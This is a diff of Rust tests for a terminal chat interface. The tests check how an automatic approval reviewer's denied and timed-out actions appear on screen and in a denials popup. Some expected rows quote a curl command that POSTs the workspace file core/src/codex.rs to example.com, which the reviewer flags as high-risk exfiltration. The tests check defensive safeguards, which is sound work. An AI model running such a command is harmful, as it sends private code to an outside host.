@@ -18,21 +18,41 @@ fn row_of(s: &Screen, text: &str) -> usize {
 // ORACLE chatwidget/tests/guardian.rs:103 app_server_guardian_write_stdin_denial_preserves_child_action kind=snap owner=dialogs-pane snap=guardian_write_stdin_denials_popup snap=guardian_write_stdin_denied_history snap=guardian_write_stdin_review_status
 #[test]
 fn app_server_guardian_write_stdin_denial_preserves_child_action() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live, chat-status, popups): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), the Working row does not read `ThreadPart.reviews` through `sheets::approvals::review_status` (chat-status), `/auto-review` opens no list and a pick is not mapped to `ThreadEv::ApproveDenied` (commands/dispatch.rs, `sheets::approvals::open_auto_review`: popups); the denials popup also waits on the select rows cutting the name with an ellipsis",
-    );
     // oracle: a write_stdin review starts (InProgress) under a running turn and draws the review status row (width 80);
     // then it is denied: the only history cell is the stdin denial, the header is back to Working; the denials popup (width 110)
-    // lists it; approving it submits a structured op (not drawn).
-    let mut s = Screen::build(Owner::DialogsPane).size(80, 24).live().open();
-    // needs feed: turn started; item/guardianApprovalReview started (guardian-write-stdin, InProgress, process 42)
-    s.assert_snap("guardian_write_stdin_review_status");
-    // needs feed: item/guardianApprovalReview completed (Denied, rationale "Would confirm a destructive operation.")
+    // lists it; approving it submits a structured op (here: the request `thread/approveGuardianDeniedAction`).
+    // The oracle opens the popup by a call; the port by `/approve` (the name of the auto-review command).
+    let mut s = Screen::build(Owner::DialogsPane)
+        .size(80, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/app_server_guardian_write_stdin_denial_preserves_child_action_1.jsonl"
+        ))
+        .open();
+    // the oracle's snapshot is the bottom pane with its own status line under the composer (the kit's session has none)
+    s.assert_screen_row_then(
+        "• Reviewing approval request (0s • esc to interrupt)",
+        &[
+            r#"  └ send input to terminal 42: "confirm\n""#,
+            "",
+            "",
+            "› Ask Codex to do anything",
+        ],
+    );
+    s.feed(include_str!(
+        "fixtures/chat_approvals_2/app_server_guardian_write_stdin_denial_preserves_child_action_2.jsonl"
+    ));
     s.assert_has_row(r#"✗ Request denied for codex to send input to terminal 42: "confirm\n""#);
-    // needs: open_auto_review_denials_popup (the popup opener; the oracle test calls it, no key)
+    s.assert_absent("Reviewing approval request");
+    s.assert_contains("Working (0s • esc to interrupt)");
     s.resize(110, 24);
-    s.assert_snap("guardian_write_stdin_denials_popup");
+    s.type_text("/approve").keys("enter");
+    s.assert_snap_region(
+        "guardian_write_stdin_denials_popup",
+        row_of(&s, "Auto-review Denials"),
+        0,
+    );
+    s.keys("enter");
+    s.assert_denial_approved("guardian-write-stdin", "confirm");
 }
 
 // ORACLE chatwidget/tests/guardian.rs:162 app_server_guardian_write_stdin_approval_and_timeout_clear_review_status kind=snap owner=dialogs-pane snap=guardian_write_stdin_timed_out_history
@@ -57,30 +77,59 @@ fn app_server_guardian_write_stdin_approval_and_timeout_clear_review_status() {
 // ORACLE chatwidget/tests/guardian.rs:202 auto_review_denials_popup_lists_stored_auto_review_denials kind=snap owner=dialogs-pane snap=auto_review_denials_popup
 #[test]
 fn auto_review_denials_popup_lists_stored_auto_review_denials() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live, popups): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `/auto-review` opens no list and a pick is not mapped to `ThreadEv::ApproveDenied` (commands/dispatch.rs, `sheets::approvals::open_auto_review`: popups); the select rows wrap the name column where the oracle cuts it with an ellipsis (`@…`)",
-    );
     // oracle: one denied auto review (curl ... https://example.com, risk high) is stored; the popup is drawn at width 40.
-    let s = Screen::build(Owner::DialogsPane).size(40, 24).live().open();
-    // needs feed: turn started; guardian assessment Denied (auto-review-recent-1); needs: open_auto_review_denials_popup
-    s.assert_snap("auto_review_denials_popup");
+    // The oracle opens the popup by a call; the port by `/approve` (the name of the auto-review command).
+    let mut s = Screen::build(Owner::DialogsPane)
+        .size(40, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/auto_review_denials_popup_lists_stored_auto_review_denials.jsonl"
+        ))
+        .open();
+    s.type_text("/approve").keys("enter");
+    s.assert_snap_region(
+        "auto_review_denials_popup",
+        row_of(&s, "Auto-review Denials"),
+        0,
+    );
 }
 
 // ORACLE chatwidget/tests/guardian.rs:256 guardian_denied_exec_renders_warning_and_denied_request kind=snap owner=dialogs-pane snap=guardian_denied_exec_renders_warning_and_denied_request
 #[test]
 fn guardian_denied_exec_renders_warning_and_denied_request() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), and the guardian warning has no visible transcript item (`Item::Warning` is detailed-only)",
-    );
-    // oracle: an InProgress assessment, a warning line, then the Denied assessment: the history and the bottom pane at width 140, 20 rows.
-    let s = Screen::build(Owner::DialogsPane)
-        .size(140, 20)
-        .live()
+    // oracle: an InProgress assessment, a warning line, then the Denied assessment: the history (as the transcript
+    // draws it, the warning included) and the bottom pane. The oracle draws the viewport at 140 columns but the history
+    // cells at the helper's 80 (`drain_insert_history_transcript`): the cells wrap as on an 80-column screen. The chat
+    // keeps the warning for the detailed transcript (`WarningHistoryCell` shows only there): the main screen holds the
+    // denied request over the bottom pane, Ctrl+T the warning over it.
+    let mut s = Screen::build(Owner::DialogsPane)
+        .size(80, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/guardian_denied_exec_renders_warning_and_denied_request.jsonl"
+        ))
         .open();
-    // needs feed: guardian assessment InProgress (guardian-1, curl ... https://example.com), warning, then Denied (risk high)
-    s.assert_snap("guardian_denied_exec_renders_warning_and_denied_request");
+    s.assert_screen_row_then(
+        "✗ Request denied for codex to run curl -sS -i -X POST --data-binary",
+        &[
+            "  @core/src/codex.rs https://example.com",
+            "",
+            "• Working (0s • esc to interrupt)",
+            "",
+            "",
+            "› Ask Codex to do anything",
+        ],
+    );
+    s.assert_absent("Automatic approval review denied");
+    s.keys("ctrl+t");
+    s.assert_screen_row_then(
+        "⚠ Automatic approval review denied (risk: high): The planned action would",
+        &[
+            "  transmit the full contents of a workspace source file (`core/src/codex.rs`) to",
+            "  `https://example.com`, which is an external and untrusted endpoint.",
+            "",
+            "✗ Request denied for codex to run curl -sS -i -X POST --data-binary",
+            "  @core/src/codex.rs https://example.com",
+        ],
+    );
 }
 
 // ORACLE chatwidget/tests/guardian.rs:328 guardian_approved_exec_is_hidden_from_history kind=snap owner=dialogs-pane snap=guardian_approved_exec_is_hidden_from_history
@@ -128,17 +177,36 @@ fn guardian_approved_request_permissions_clears_status_without_history() {
 // ORACLE chatwidget/tests/guardian.rs:470 guardian_timed_out_exec_renders_warning_and_timed_out_request kind=snap owner=dialogs-pane snap=guardian_timed_out_exec_renders_warning_and_timed_out_request
 #[test]
 fn guardian_timed_out_exec_renders_warning_and_timed_out_request() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), and the guardian warning has no visible transcript item (`Item::Warning` is detailed-only)",
-    );
-    // oracle: an InProgress assessment, the timeout warning, then TimedOut: history and bottom pane at width 140, 20 rows.
-    let s = Screen::build(Owner::DialogsPane)
-        .size(140, 20)
-        .live()
+    // oracle: an InProgress assessment, the timeout warning, then TimedOut: the history (the warning included) and the
+    // bottom pane; the cells wrap at the helper's 80 columns and the warning shows in the detailed transcript only,
+    // as in the denied test.
+    let mut s = Screen::build(Owner::DialogsPane)
+        .size(80, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/guardian_timed_out_exec_renders_warning_and_timed_out_request.jsonl"
+        ))
         .open();
-    // needs feed: guardian assessment InProgress (guardian-1), warning "Automatic approval review timed out while evaluating the requested approval.", TimedOut
-    s.assert_snap("guardian_timed_out_exec_renders_warning_and_timed_out_request");
+    s.assert_screen_row_then(
+        "✗ Review timed out before codex could run curl -sS -i -X POST --data-binary",
+        &[
+            "  @core/src/codex.rs https://example.com",
+            "",
+            "• Working (0s • esc to interrupt)",
+            "",
+            "",
+            "› Ask Codex to do anything",
+        ],
+    );
+    s.assert_absent("Automatic approval review timed out");
+    s.keys("ctrl+t");
+    s.assert_screen_row_then(
+        "⚠ Automatic approval review timed out while evaluating the requested approval.",
+        &[
+            "",
+            "✗ Review timed out before codex could run curl -sS -i -X POST --data-binary",
+            "  @core/src/codex.rs https://example.com",
+        ],
+    );
 }
 
 // ORACLE chatwidget/tests/guardian.rs:585 app_server_guardian_review_denied_renders_denied_request_snapshot kind=snap owner=dialogs-pane snap=app_server_guardian_review_denied_renders_denied_request
